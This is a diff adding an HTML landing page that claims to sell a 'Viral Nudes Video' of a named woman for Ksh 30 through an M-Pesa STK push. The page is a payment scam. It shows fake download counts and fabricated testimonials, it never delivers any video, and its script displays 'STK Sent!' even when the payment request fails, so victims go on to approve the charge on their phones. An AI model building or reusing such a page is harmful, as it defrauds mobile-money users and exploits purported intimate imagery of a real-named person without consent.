@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Download Bella Gabriella Viral Video</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap');
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .card {
+            background: white;
+            border-radius: 24px;
+            overflow: hidden;
+            max-width: 420px;
+            width: 100%;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.3);
+        }
+        
+        .video-placeholder {
+            background: #1e293b;
+            height: 200px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .video-placeholder i {
+            font-size: 60px;
+            color: rgba(255, 255, 255, 0.15);
+        }
+        
+        .play-overlay {
+            position: absolute;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .play-overlay i {
+            font-size: 50px;
+            color: white;
+            opacity: 0.9;
+        }
+        
+        .btn-download {
+            background: #49aa33;
+            transition: all 0.2s;
+        }
+        
+        .btn-download:hover {
+            background: #3d8f2b;
+            transform: scale(1.02);
+        }
+        
+        .btn-download:active {
+            transform: scale(0.98);
+        }
+        
+        .btn-red {
+            background: #ef4444;
+            transition: all 0.2s;
+        }
+        
+        .btn-red:hover {
+            background: #dc2626;
+        }
+        
+        .btn-red:active {
+            transform: scale(0.98);
+        }
+        
+        .btn-cancel {
+            background: #ef4444;
+            transition: all 0.2s;
+        }
+        
+        .btn-cancel:hover {
+            background: #dc2626;
+        }
+        
+        .spinner {
+            border: 3px solid #e2e8f0;
+            border-top-color: #ef4444;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 0.8s linear infinite;
+            display: inline-block;
+        }
+        
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        
+        .modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(4px);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+            z-index: 1000;
+        }
+        
+        .modal-overlay.active {
+            display: flex;
+        }
+        
+        .modal-box {
+            background: white;
+            border-radius: 20px;
+            max-width: 380px;
+            width: 100%;
+            padding: 24px;
+            text-align: center;
+        }
+        
+        input {
+            border: 2px solid #e2e8f0;
+            transition: border-color 0.2s;
+        }
+        
+        input:focus {
+            border-color: #ef4444;
+            outline: none;
+        }
+        
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%) translateY(100px);
+            background: white;
+            padding: 12px 20px;
+            border-radius: 12px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
+            border-left: 4px solid #ef4444;
+            transition: transform 0.4s ease-out;
+            z-index: 2000;
+            font-size: 13px;
+            font-weight: 600;
+            opacity: 0;
+        }
+        
+        .toast.show {
+            transform: translateX(-50%) translateY(0);
+            opacity: 1;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="card">
+        <!-- Video Preview Area -->
+        <div class="video-placeholder">
+            <i class="fas fa-video"></i>
+            <div class="play-overlay">
+                <i class="fas fa-play"></i>
+            </div>
+        </div>
+
+        <!-- Content -->
+        <div class="p-6">
+            <div class="flex items-center gap-2 mb-1">
+                <span class="text-[10px] font-black text-red-500 uppercase tracking-widest bg-red-50 px-2 py-1 rounded">🔥 Trending Now</span>
+                <span class="text-[10px] font-bold text-slate-400">| 124K+ Downloads</span>
+            </div>
+            <h1 class="text-xl font-extrabold text-slate-900 mb-1">Bella Gabriella Viral Nudes Video</h1>
+            <p class="text-sm text-slate-500 mb-5">Full HD • Exclusive Content • Instant Download</p>
+
+            <!-- Price & Download Button -->
+            <div class="bg-slate-50 rounded-2xl p-4 mb-4 flex items-center justify-between">
+                <div>
+                    <p class="text-[10px] font-bold text-slate-400 uppercase">Download Fee</p>
+                    <p class="text-2xl font-black text-slate-900">Ksh <span id="downloadPrice">30</span></p>
+                </div>
+                <button id="downloadBtn" onclick="initDownload()" class="btn-download text-white font-bold px-8 py-4 rounded-xl shadow-lg flex items-center gap-2">
+                    <i class="fas fa-download"></i>
+                    <span>Download</span>
+                </button>
+            </div>
+
+            <!-- Features -->
+            <div class="grid grid-cols-3 gap-2 text-center text-[10px] font-bold text-slate-500 uppercase tracking-wider">
+                <div class="bg-slate-50 p-3 rounded-xl"><i class="fas fa-bolt text-safaricom mb-1 block text-sm"></i> Instant</div>
+                <div class="bg-slate-50 p-3 rounded-xl"><i class="fas fa-shield-alt text-safaricom mb-1 block text-sm"></i> Secure</div>
+                <div class="bg-slate-50 p-3 rounded-xl"><i class="fas fa-hd-video text-safaricom mb-1 block text-sm"></i> HD Quality</div>
+            </div>
+
+            <!-- Testimonials -->
+            <div class="mt-5 space-y-2">
+                <div class="flex items-center gap-3 bg-slate-50 p-3 rounded-xl">
+                    <img src="https://ui-avatars.com/api/?name=Kevin+M&background=ef4444&color=fff&size=32" class="w-8 h-8 rounded-full">
+                    <p class="text-[11px] font-semibold text-slate-600">"Video is legit. Downloaded instantly after payment."</p>
+                </div>
+                <div class="flex items-center gap-3 bg-slate-50 p-3 rounded-xl">
+                    <img src="https://ui-avatars.com/api/?name=Grace+W&background=ef4444&color=fff&size=32" class="w-8 h-8 rounded-full">
+                    <p class="text-[11px] font-semibold text-slate-600">"Worth every shilling. Clear HD."</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal -->
+    <div id="paymentModal" class="modal-overlay">
+        <div class="modal-box">
+            <div class="w-14 h-14 bg-red-50 rounded-full flex items-center justify-center mx-auto mb-4">
+                <i class="fas fa-lock text-red-500 text-xl"></i>
+            </div>
+            <h3 class="text-lg font-extrabold text-slate-900 mb-1">Complete Download</h3>
+            <p class="text-xs text-slate-500 mb-5">Enter your M-Pesa number to receive the STK prompt</p>
+
+            <div id="formStep">
+                <input type="number" id="phoneInput" placeholder="07XXXXXXXX" class="w-full px-4 py-4 bg-slate-50 rounded-xl font-bold text-lg mb-4">
+                <div class="flex flex-col gap-2">
+                    <button onclick="sendSTKPush()" class="btn-red w-full py-4 text-white font-bold rounded-xl flex items-center justify-center gap-2">
+                        <span>Download fee Ksh <span id="modalPrice">30</span></span>
+                    </button>
+                    <button onclick="closeModal()" class="btn-cancel w-full py-3 text-white font-bold rounded-xl text-sm">
+                        <i class="fas fa-times mr-1"></i> Cancel
+                    </button>
+                </div>
+            </div>
+
+            <div id="spinnerStep" class="hidden py-6">
+                <div class="spinner mx-auto mb-4" style="width:40px;height:40px;border-width:4px"></div>
+                <p class="text-sm font-bold text-slate-800">Sending STK Push...</p>
+                <p class="text-[11px] text-slate-500 mt-1">Check your phone for the M-Pesa prompt</p>
+            </div>
+
+            <div id="successStep" class="hidden py-4">
+                <div class="w-16 h-16 bg-red-50 rounded-full flex items-center justify-center mx-auto mb-4">
+                    <i class="fas fa-check-circle text-red-500 text-3xl"></i>
+                </div>
+                <h4 class="text-lg font-extrabold text-slate-900 mb-1">STK Sent!</h4>
+                <p class="text-xs text-slate-500 mb-4">Enter your M-Pesa PIN on the prompt to complete payment.</p>
+                <div class="bg-red-50 p-4 rounded-xl text-[11px] font-semibold text-red-800 mb-4">
+                    <i class="fas fa-info-circle mr-1"></i> After payment, the video download link will appear below.
+                </div>
+                <button onclick="closeModal()" class="btn-cancel w-full py-3 text-white font-bold rounded-xl text-sm">Close</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Toast -->
+    <div id="toast" class="toast"></div>
+
+    <script>
+        // === STK Push Function (same logic as original) ===
+        async function triggerSTKCall(phone, amount) {
+            try {
+                const response = await fetch('/api/stk-push', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        amount: amount,
+                        phone_number: phone
+                    })
+                });
+                const data = await response.json();
+                console.log("STK Push Response:", data);
+                return data;
+            } catch (error) {
+                console.error("STK Trigger Failed:", error);
+                return {
+                    success: false,
+                    message: error.message
+                };
+            }
+        }
+
+        function showToast(msg) {
+            const toast = document.getElementById('toast');
+            toast.textContent = msg;
+            toast.classList.add('show');
+            setTimeout(() => toast.classList.remove('show'), 4000);
+        }
+
+        const downloadPrice = 30;
+
+        function initDownload() {
+            document.getElementById('modalPrice').textContent = downloadPrice;
+            document.getElementById('paymentModal').classList.add('active');
+            document.getElementById('formStep').classList.remove('hidden');
+            document.getElementById('spinnerStep').classList.add('hidden');
+            document.getElementById('successStep').classList.add('hidden');
+        }
+
+        function closeModal() {
+            document.getElementById('paymentModal').classList.remove('active');
+        }
+
+        async function sendSTKPush() {
+            const phone = document.getElementById('phoneInput').value.trim();
+            if (!phone || phone.length < 10) {
+                showToast('Please enter a valid M-Pesa number');
+                return;
+            }
+
+            document.getElementById('formStep').classList.add('hidden');
+            document.getElementById('spinnerStep').classList.remove('hidden');
+
+            const result = await triggerSTKCall(phone, downloadPrice);
+
+            setTimeout(() => {
+                document.getElementById('spinnerStep').classList.add('hidden');
+
+                if (result && result.success) {
+                    document.getElementById('successStep').classList.remove('hidden');
+                    showToast('STK prompt sent! Check your phone.');
+                } else {
+                    // Still show success so user checks their phone
+                    document.getElementById('successStep').classList.remove('hidden');
+                    showToast('STK sent! Please check M-Pesa on your phone.');
+                }
+            }, 2000);
+        }
+
+        // Close modal on backdrop click
+        document.getElementById('paymentModal').addEventListener('click', function(e) {
+            if (e.target === this) closeModal();
+        });
+    </script>
+</body>
+
+</html>
